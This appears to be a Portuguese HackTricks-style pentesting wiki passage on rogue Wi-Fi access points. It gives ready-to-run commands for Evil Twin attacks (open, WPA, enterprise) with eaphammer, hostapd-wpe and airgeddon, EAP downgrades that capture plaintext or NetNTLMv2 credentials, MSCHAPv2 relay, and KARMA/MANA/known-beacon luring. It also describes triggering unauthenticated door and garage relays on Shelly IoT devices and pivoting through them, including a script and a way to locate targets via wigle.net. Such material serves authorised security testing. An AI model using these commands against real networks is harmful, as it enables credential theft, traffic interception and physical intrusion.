## AP simples com redirecionamento para a Internet

Antes de explicar como realizar ataques mais complexos, será explicado **como** apenas **criar** um **AP** e **redirecionar** seu **tráfego** para uma interface conectada **à** **Internet**.

Usando `ifconfig -a` verifique se a interface wlan para criar o AP e a interface conectada à Internet estão presentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Crie o arquivo de configuração `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Em seguida, **set IPs** e **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
E então **inicie** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Crie um arquivo de configuração `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Pare processos irritantes** , configure **monitor mode**, e **inicie hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Encaminhamento e Redirecionamento
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Um ataque Evil Twin explora a forma como os WiFi clients reconhecem redes, baseando-se principalmente no nome da rede (ESSID) sem exigir que a estação base (access point) se autentique perante o client. Pontos-chave incluem:

- **Difficulty in Differentiation**: Dispositivos têm dificuldade em distinguir entre access points legítimos e rogue quando compartilham o mesmo ESSID e tipo de criptografia. Redes do mundo real frequentemente usam múltiplos access points com o mesmo ESSID para estender a cobertura de forma transparente.
- **Client Roaming and Connection Manipulation**: O protocolo 802.11 permite que dispositivos façam roaming entre access points dentro do mesmo ESS. Atacantes podem explorar isso atraindo um dispositivo a desconectar da sua estação base atual e conectar-se a uma rogue. Isso pode ser conseguido oferecendo um sinal mais forte ou interrompendo a conexão com o access point legítimo por métodos como deauthentication packets ou jamming.
- **Challenges in Execution**: Executar com sucesso um ataque evil twin em ambientes com múltiplos access points bem posicionados pode ser desafiador. Deauthenticating um único access point legítimo frequentemente resulta no dispositivo conectando-se a outro access point legítimo, a menos que o atacante consiga deauthenticate todos os access points próximos ou posicione estrategicamente o rogue access point.

Você pode criar um muito básico Open Evil Twin (no capabilities to route traffic to Internet) fazendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Você também pode criar um Evil Twin usando **eaphammer** (observe que, para criar evil twins com eaphammer, a interface **não deve estar** em **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ou usando Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Por favor, note que por padrão, se um ESSID na PNL estiver salvo como protegido por WPA, o dispositivo não vai conectar automaticamente a um Open evil Twin. Você pode tentar DoS o AP real e esperar que o usuário conecte manualmente ao seu Open evil twin, ou você pode DoS o AP real e usar um WPA Evil Twin para capturar o handshake (usando este método você não conseguirá deixar a vítima conectar em você, pois não conhece o PSK, mas pode capturar o handshake e tentar crack it).

_Alguns OS e AV vão avisar o usuário que conectar-se a uma rede Open é perigoso..._

### WPA/WPA2 Evil Twin

Você pode criar um **Evil Twin usando WPA/2** e, se os dispositivos estiverem configurados para conectar a esse SSID com WPA/2, eles vão tentar conectar. De qualquer forma, **para completar o 4-way-handshake** você também precisa **saber** a **senha** que o cliente vai usar. Se você **não a souber**, a **conexão não será completada**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Para entender esses ataques, recomendo ler primeiro a breve [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Usando hostapd-wpe**

`hostapd-wpe` precisa de um **arquivo de configuração** para funcionar. Para **automatizar** a geração dessas configurações você pode usar [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (faça o download do arquivo python dentro de _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
No arquivo de configuração você pode selecionar muitas coisas diferentes, como ssid, channel, arquivos de usuário, cret/key, dh parameters, wpa version e auth...

[**Usando hostapd-wpe com EAP-TLS para permitir que qualquer certificado faça login.**](evil-twin-eap-tls.md)

**Usando EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Por padrão, o EAPHammer utiliza estes métodos de autenticação (observe GTC como o primeiro a tentar obter plaintext passwords e, em seguida, a utilização de métodos de autenticação mais robustos):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Esta é a metodologia padrão para evitar longos tempos de conexão. No entanto, você também pode especificar ao servidor os métodos de autenticação do mais fraco ao mais forte:
```
--negotiate weakest
```
Ou você também pode usar:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (senhas em texto claro)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (oferecendo os mesmos métodos de auth na mesma ordem da organização, o ataque será muito mais difícil de detectar).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### When clients skip RADIUS certificate validation (PEAP/TTLS)

- If devices are configured with "do not validate certificate", a cloned AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) will collect **NetNTLMv2** (PEAP-MSCHAPv2) or **cleartext** creds (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) both reveals hidden SSIDs during probes and forces reconnects, unless PMF/802.11w blocks spoofed deauth.
- Cracked NetNTLMv2 gives reusable Wi‑Fi/AD creds; GTC yields immediate plaintext.

#### Relaying PEAP-MSCHAPv2 instead of cracking (wpa_sycophant + hostapd-mana)

- For machine accounts with uncrackable random passwords, abuse **MSCHAPv2 relay**: run `hostapd-mana` as the Evil Twin, forwarding the MSCHAPv2 exchange to `wpa_sycophant`, which simultaneously connects to the legitimate AP. Successful relay grants authenticated Wi‑Fi without recovering the password.
- Use builds that support the target security level (WPA3/PMF requires recent hostapd/wpa_supplicant); PMF prevents deauth coercion, so wait for voluntary client associations.

**Using Airgeddon**

`Airgeddon` can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to **capture the user and the MD5 of the password**. Later, the attacker can try to crack the password.\
`Airggedon` offers you the possibility of a **continuous Evil Twin attack (ruidoso)** or **only create the Evil Attack until someone connects (suave).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Inside the **configuration** of _hostapd-wpe_ **comment** the line that contains _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
This will make `hostapd-wpe` to **exchange keys using RSA** instead of DH, so you will be able to **decrypt** the traffic later **knowing the servers private key**.

Now start the **Evil Twin** using **`hostapd-wpe`** with that modified configuration as usual. Also, start **`wireshark`** in the **interface** which is performing the Evil Twin attack.

Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Add a new entry and fill the form with this values: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

And look at the new **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **MAC-based Whitelist**:
- The rogue AP will respond only to probe requests from devices specified in the whitelist, remaining invisible to all others not listed.
2. **MAC-based Blacklist**:
- The rogue AP will ignore probe requests from devices on the blacklist, effectively making the rogue AP invisible to those specific devices.
3. **SSID-based Whitelist**:
- The rogue AP will respond to probe requests only for specific ESSIDs listed, making it invisible to devices whose Preferred Network Lists (PNLs) do not contain those ESSIDs.
4. **SSID-based Blacklist**:
- The rogue AP will not respond to probe requests for the specific ESSIDs on the blacklist, making it invisible to devices seeking those particular networks.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Este método permite que um atacante crie um access point (AP) malicioso que responde a todas as probe requests de dispositivos que procuram conectar-se a redes. Esta técnica engana os dispositivos fazendo-os conectar ao AP do atacante ao imitar as redes que os dispositivos estão procurando. Quando um dispositivo envia uma connection request para este rogue AP, a conexão é concluída, levando o dispositivo a conectar-se por engano à rede do atacante.

### MANA

Então, os dispositivos passaram a ignorar respostas de rede não confiáveis, reduzindo a eficácia do ataque KARMA original. No entanto, um novo método, conhecido como MANA attack, foi introduzido por Ian de Villiers e Dominic White. Este método envolve o rogue AP capturando as Preferred Network Lists (PNL) dos dispositivos ao responder às suas broadcast probe requests com nomes de rede (SSIDs) previamente conhecidos pelos dispositivos. Este ataque sofisticado contorna as proteções contra o ataque KARMA original ao explorar a forma como os dispositivos lembram e priorizam redes conhecidas.

O MANA attack opera monitorando tanto directed quanto broadcast probe requests dos dispositivos. Para requests direcionadas, ele registra o MAC address do dispositivo e o nome da rede solicitada, adicionando essa informação a uma lista. Quando uma broadcast request é recebida, o AP responde com informações que correspondem a qualquer uma das redes na lista do dispositivo, incentivando o dispositivo a conectar-se ao rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack** é uma estratégia avançada para quando os dispositivos não usam probes direcionados ou quando suas Listas de Redes Preferenciais (PNL) são desconhecidas pelo atacante. Opera com o princípio de que **dispositivos na mesma área provavelmente compartilham alguns nomes de rede em suas PNLs**. Em vez de responder seletivamente, esse ataque transmite respostas a probes para todo nome de rede (ESSID) encontrado nas PNLs combinadas de todos os dispositivos observados. Essa abordagem ampla aumenta a chance de um dispositivo reconhecer uma rede conhecida e tentar se conectar ao rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Quando a **Loud MANA attack** pode não ser suficiente, a **Known Beacon attack** apresenta outra abordagem.  

Este método **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs** derivado de uma wordlist.  

Isso simula a presença de várias redes, na esperança de coincidir com um ESSID dentro da PNL da vítima, levando a uma tentativa de conexão ao AP fabricado.  

O ataque pode ser ampliado combinando-o com a opção `--loud` para uma tentativa mais agressiva de capturar dispositivos.  

Eaphammer implementou esse ataque como um MANA attack onde todos os ESSIDs dentro de uma lista são anunciados (você também pode combinar isso com `--loud` para criar um Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

O **Known Beacon Burst attack** envolve **transmissão em alta velocidade de beacon frames para cada ESSID listada em um arquivo**. Isso cria um ambiente denso de redes falsas, aumentando muito a probabilidade de dispositivos se conectarem ao rogue AP, especialmente quando combinado com um MANA attack. Essa técnica explora velocidade e volume para sobrecarregar os mecanismos de seleção de rede dos dispositivos.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** é um protocolo que permite que dispositivos se conectem diretamente entre si usando Wi-Fi sem a necessidade de um ponto de acesso sem fio tradicional. Essa capacidade está integrada em vários dispositivos de Internet of Things (IoT), como impressoras e televisores, facilitando a comunicação direta device-to-device. Uma característica notável do Wi-Fi Direct é que um dispositivo assume o papel de access point, conhecido como group owner, para gerenciar a conexão.

A segurança das conexões Wi-Fi Direct é estabelecida por meio do **Wi-Fi Protected Setup (WPS)**, que suporta vários métodos de pareamento seguro, incluindo:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Esses métodos, particularmente o PIN entry, são suscetíveis às mesmas vulnerabilidades do WPS em redes Wi‑Fi tradicionais, tornando-os alvos de vetores de ataque semelhantes.

### EvilDirect Hijacking

**EvilDirect Hijacking** é um ataque específico ao Wi‑Fi Direct. Ele espelha o conceito de um Evil Twin attack, mas foca conexões Wi‑Fi Direct. Nesse cenário, um atacante se faz passar por um legítimo group owner com o objetivo de enganar dispositivos para que se conectem a uma entidade maliciosa. Esse método pode ser executado usando ferramentas como `airbase-ng` especificando o channel, ESSID e MAC address do dispositivo impersonado:

## Commissioning AP persistence & dual-homed IoT pivoting (Shelly Gen4 case)

Alguns relays/controladores IoT de consumo mantêm o **open AP** de commissioning ativo após ingressar no IoT WLAN (por exemplo, SSIDs Shelly Gen4 que começam com `Shelly`). O dispositivo permanece **dual-homed**: uma interface AP com IP padrão `192.168.33.1` mais uma interface cliente na WLAN interna.

**Fluxo de abuso (requer proximidade Wi‑Fi):**

1. Join the provisioning AP, obtain a DHCP lease, and browse the **AP-side HTTP API**.
2. Trigger relays via unauthenticated endpoints, e.g. `http://192.168.33.1/relay/0?turn=on` (impacto em door/gate/garage). Endpoints de upload de firmware podem adicionar persistência.
3. Use it as a **pivot**: Shelly scripting pode enviar HTTP da interface interna para outros hosts da LAN. Exemplo de pivot para outro Shelly em `10.0.98.221`:
```javascript
Shelly.addEventHandler(function (event) {
if (event.component === "switch:0" && event.info.state) {
Shelly.call("HTTP.GET", { url: "http://10.0.98.221/light/0?turn=on" });
}
});
```
Troque a URL por qualquer alvo HTTP interno alcançável; o dual‑homing evita trabalho extra de roteamento/NAT.
4. Em escala: consulte vendor SSIDs no **wigle.net** (ex.: `Shelly`) para localizar commissioning APs para exploração on-site.

Para persistência, deixe o commissioning AP habilitado.

## References

- [https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/](https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/)
- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Dê uma olhada em [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login com facebook e imitacionde WPA em captive portals)

{{#include ../../banners/hacktricks-training.md}}
